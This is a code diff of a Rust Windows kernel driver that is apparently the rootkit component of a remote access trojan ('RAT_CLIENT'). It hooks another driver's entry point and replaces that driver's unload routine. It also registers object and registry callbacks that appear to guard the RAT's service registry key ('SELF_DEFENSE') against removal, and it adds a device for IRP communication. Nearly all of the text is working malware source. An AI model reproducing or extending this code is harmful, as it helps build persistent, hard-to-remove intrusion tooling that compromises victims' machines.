@@ -1,6 +1,6 @@
 use alloc::boxed::Box;
 use core::ffi::c_void;
-use core::sync::atomic::{AtomicPtr, Ordering};
+use core::sync::atomic::Ordering;
 use core::{mem, ptr, slice};
 
 use aho_corasick::AhoCorasickBuilder;
@@ -8,8 +8,8 @@ use rat_common::utils::DropGuard;
 use wdk::{self, nt_success};
 use wdk_sys::_MODE::KernelMode;
 use wdk_sys::ntddk::{
-    CmUnRegisterCallback, KeDelayExecutionThread, ObUnRegisterCallbacks, PsCreateSystemThread,
-    RtlInitUnicodeString, ZwClose, ZwCreateKey,
+    CmUnRegisterCallback, IoDeleteDevice, IoDeleteSymbolicLink, KeDelayExecutionThread,
+    ObUnRegisterCallbacks, PsCreateSystemThread, RtlInitUnicodeString, ZwClose, ZwCreateKey,
 };
 use wdk_sys::{
     HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, NTSTATUS, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
@@ -20,12 +20,13 @@ use wdk_sys::{
 use widestring::{U16CStr, Utf16Str, u16cstr};
 
 use crate::global::{
-    CM_REGISTER_CALLBACK_COOKIE, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE, RAT_CLIENT,
-    RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
-    RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE, SERVICE_REGISTRY_AHO_CORASICK,
+    CM_REGISTER_CALLBACK_COOKIE, DOS_NAME, MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE,
+    ORIGINAL_DRIVER_UNLOAD, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_SERVICE_PATH,
+    RAT_CLIENT_SERVICE_REGISTRY, RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE,
+    SERVICE_REGISTRY_AHO_CORASICK,
 };
-use crate::handlers::object;
 use crate::handlers::registry::cm_register_callback;
+use crate::handlers::{irp, object};
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
 use crate::{error, info, warn};
@@ -35,10 +36,15 @@ type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
 unsafe extern "C" fn initialize_thread_routine(driver: *mut c_void) {
     let driver = driver.cast();
     let mut sleep = LARGE_INTEGER { QuadPart: -3000000 };
-    for _ in 0..MAX_INITIALIZE_ATTEMPTS {
+
+    for retry in 0..MAX_INITIALIZE_ATTEMPTS {
+        info!(
+            "Initialization attempt #{}/{MAX_INITIALIZE_ATTEMPTS}",
+            retry + 1,
+        );
         let status = unsafe { KeDelayExecutionThread(KernelMode as i8, 0, &mut sleep) };
         if !nt_success(status) {
-            error!("KeDelayExecutionThread failed: 0x{status:X}");
+            error!("KeDelayExecutionThread error: 0x{status:X}");
             break;
         }
 
@@ -76,7 +82,7 @@ fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
             ptr::null_mut(),
         )
     };
-    anyhow::ensure!(nt_success(status), "ZwCreateKey failed: 0x{status:X}");
+    anyhow::ensure!(nt_success(status), "ZwCreateKey error: 0x{status:X}");
 
     let guard = DropGuard::new(key, |key| unsafe {
         let _ = ZwClose(key);
@@ -107,7 +113,7 @@ fn setup_service_registry(path: &U16CStr) -> anyhow::Result<()> {
             REG_SZ,
         ),
     ] {
-        anyhow::ensure!(nt_success(status), "ZwSetValueKey failed: 0x{status:X}");
+        anyhow::ensure!(nt_success(status), "ZwSetValueKey error: 0x{status:X}");
     }
 
     drop(guard);
@@ -141,36 +147,10 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
         Ok(handle) => {
             info!("Registered object callbacks");
 
-            if let Some(driver) = unsafe { driver.as_mut() } {
-                let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(handle, Ordering::AcqRel);
-                if !handle.is_null() {
-                    unsafe {
-                        ObUnRegisterCallbacks(handle);
-                    }
-                }
-
-                static CURRENT_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
-                if let Some(unload) = driver.DriverUnload {
-                    CURRENT_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
-                }
-
-                driver.DriverUnload = Some(driver_unload);
-
-                unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
-                    let old_driver_unload_ptr = CURRENT_DRIVER_UNLOAD.load(Ordering::Acquire);
-                    if !old_driver_unload_ptr.is_null() {
-                        unsafe {
-                            let old_driver_unload =
-                                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
-                            old_driver_unload(driver);
-                        }
-                    }
-
-                    let handle =
-                        OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel);
-                    unsafe {
-                        ObUnRegisterCallbacks(handle);
-                    }
+            let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(handle, Ordering::AcqRel);
+            if !handle.is_null() {
+                unsafe {
+                    ObUnRegisterCallbacks(handle);
                 }
             }
         }
@@ -180,78 +160,39 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
         }
     }
 
+    match AhoCorasickBuilder::new()
+        .ascii_case_insensitive(true)
+        .build([unsafe {
+            slice::from_raw_parts(
+                RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE.as_ptr().cast(), // interpret as a &[u8] slice for aho-corasick
+                RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE.len() * mem::size_of::<u16>(),
+            )
+        }]) {
+        Ok(ac) => {
+            info!("Constructed Aho-Corasick automaton");
+            let ac =
+                SERVICE_REGISTRY_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
+            if !ac.is_null() {
+                unsafe {
+                    let _ = Box::from_raw(ac);
+                }
+            }
+        }
+        Err(e) => {
+            success = false;
+            error!("Failed to build Aho-Corasick automaton: {e}");
+        }
+    }
+
     match cm_register_callback(driver) {
         Ok(cookie) => {
             info!("Registered registry callbacks");
 
-            if let Some(driver) = unsafe { driver.as_mut() } {
-                let cookie =
-                    CM_REGISTER_CALLBACK_COOKIE.swap(unsafe { cookie.QuadPart }, Ordering::AcqRel);
-                if cookie != 0 {
-                    unsafe {
-                        let _ = CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie });
-                    }
-                }
-
-                match AhoCorasickBuilder::new()
-                    .ascii_case_insensitive(true)
-                    .build([unsafe {
-                        slice::from_raw_parts(
-                            RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE.as_ptr().cast(), // interpret as a &[u8] slice for aho-corasick
-                            RAT_CLIENT_SERVICE_REGISTRY_SELF_DEFENSE.len() * mem::size_of::<u16>(),
-                        )
-                    }]) {
-                    Ok(ac) => {
-                        info!("Constructed Aho-Corasick automaton {:?}", unsafe {
-                            slice::from_raw_parts(
-                                RAT_CLIENT_SERVICE_REGISTRY.as_ptr().cast::<u8>(), // interpret as a &[u8] slice for aho-corasick
-                                RAT_CLIENT_SERVICE_REGISTRY.len() * mem::size_of::<u16>(),
-                            )
-                        });
-                        let ac = SERVICE_REGISTRY_AHO_CORASICK
-                            .swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
-                        if !ac.is_null() {
-                            unsafe {
-                                let _ = Box::from_raw(ac);
-                            }
-                        }
-                    }
-                    Err(e) => {
-                        success = false;
-                        error!("Failed to build Aho-Corasick automaton: {e}");
-                    }
-                }
-
-                static CURRENT_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
-                if let Some(unload) = driver.DriverUnload {
-                    CURRENT_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
-                }
-
-                driver.DriverUnload = Some(driver_unload);
-
-                unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
-                    let old_driver_unload_ptr = CURRENT_DRIVER_UNLOAD.load(Ordering::Acquire);
-                    if !old_driver_unload_ptr.is_null() {
-                        unsafe {
-                            let old_driver_unload =
-                                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
-                            old_driver_unload(driver);
-                        }
-                    }
-
-                    let cookie = CM_REGISTER_CALLBACK_COOKIE.swap(0, Ordering::AcqRel);
-                    let status =
-                        unsafe { CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie }) };
-                    if !nt_success(status) {
-                        warn!("CmUnRegisterCallback failed: 0x{status:X}");
-                    }
-
-                    let ac = SERVICE_REGISTRY_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
-                    if !ac.is_null() {
-                        unsafe {
-                            let _ = Box::from_raw(ac);
-                        }
-                    }
+            let cookie =
+                CM_REGISTER_CALLBACK_COOKIE.swap(unsafe { cookie.QuadPart }, Ordering::AcqRel);
+            if cookie != 0 {
+                unsafe {
+                    let _ = CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie });
                 }
             }
         }
@@ -261,8 +202,75 @@ fn initialize(driver: PDRIVER_OBJECT) -> anyhow::Result<()> {
         }
     }
 
+    match irp::create_device(driver) {
+        Ok(_) => info!("Created device"),
+        Err(e) => {
+            success = false;
+            error!("Failed to create device: {e}");
+        }
+    }
+
     anyhow::ensure!(success, "At least 1 initialization routine failed");
     Ok(())
+}
+
+fn remove_registered_services(driver: PDRIVER_OBJECT) {
+    if let Some(driver) = unsafe { driver.as_ref() }
+        && !driver.DeviceObject.is_null()
+    {
+        let device = driver.DeviceObject;
+        info!("Removing device object: {device:p}");
+
+        let mut dos_name = UNICODE_STRING::default();
+        unsafe {
+            RtlInitUnicodeString(&mut dos_name, DOS_NAME.as_ptr());
+            let status = IoDeleteSymbolicLink(&mut dos_name);
+            if !nt_success(status) {
+                warn!("IoDeleteSymbolicLink error: 0x{status:X}");
+            }
+
+            IoDeleteDevice(device);
+        }
+    }
+
+    let cookie = CM_REGISTER_CALLBACK_COOKIE.swap(0, Ordering::AcqRel);
+    if cookie != 0 {
+        info!("Unregistering registry callbacks");
+        let status = unsafe { CmUnRegisterCallback(LARGE_INTEGER { QuadPart: cookie }) };
+        if !nt_success(status) {
+            warn!("CmUnRegisterCallback error: 0x{status:X}");
+        }
+    }
+
+    let ac = SERVICE_REGISTRY_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
+    if !ac.is_null() {
+        info!("Dropping Aho-Corasick automaton");
+        unsafe {
+            let _ = Box::from_raw(ac);
+        }
+    }
+
+    let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel);
+    if !handle.is_null() {
+        info!("Unregistering object callbacks");
+        unsafe {
+            ObUnRegisterCallbacks(handle);
+        }
+    }
+}
+
+unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
+    info!("DriverUnload: {driver:p}");
+    let old_driver_unload_ptr = ORIGINAL_DRIVER_UNLOAD.load(Ordering::Acquire);
+    if !old_driver_unload_ptr.is_null() {
+        unsafe {
+            let old_driver_unload =
+                mem::transmute::<*mut u8, DriverUnloadFn>(old_driver_unload_ptr);
+            old_driver_unload(driver);
+        }
+    }
+
+    remove_registered_services(driver);
 }
 
 pub fn driver_entry_prehook(
@@ -285,17 +293,25 @@ pub fn driver_entry_prehook(
     };
     anyhow::ensure!(
         nt_success(status),
-        "PsCreateSystemThread failed: 0x{status:X}",
+        "PsCreateSystemThread error: 0x{status:X}",
     );
 
     Ok(())
 }
 
 pub fn driver_entry_posthook(
-    _: PDRIVER_OBJECT,
+    driver: PDRIVER_OBJECT,
     _: Option<&Utf16Str>,
     status: NTSTATUS,
 ) -> anyhow::Result<()> {
     info!("Original DriverEntry returned with status: 0x{status:X}");
+    if let Some(driver) = unsafe { driver.as_mut() } {
+        if let Some(unload) = driver.DriverUnload {
+            ORIGINAL_DRIVER_UNLOAD.store(unload as *mut u8, Ordering::Release);
+        }
+
+        driver.DriverUnload = Some(driver_unload);
+    }
+
     Ok(())
 }
